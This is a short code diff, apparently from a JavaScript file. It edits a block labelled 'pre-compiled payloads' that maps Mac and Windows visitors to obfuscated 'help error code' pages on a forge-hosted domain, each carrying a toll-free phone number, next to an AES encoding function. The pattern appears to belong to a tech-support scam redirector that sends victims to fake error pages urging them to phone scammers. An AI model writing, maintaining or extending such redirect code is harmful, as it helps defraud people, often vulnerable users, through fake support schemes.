@@ -47,7 +47,7 @@ function aesEncode(text) {
 // PRE-COMPILED PAYLOADS (KEY OPTIMIZATION)
 // --------------------
 const LINKS = {
-    mac: "https://henlennnapy11.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-844-590-5369/mac",
+    mac: "https://henlennnapy11.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-844-590-5369",
     other: "https://henlennnapy11.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369"
 };
 
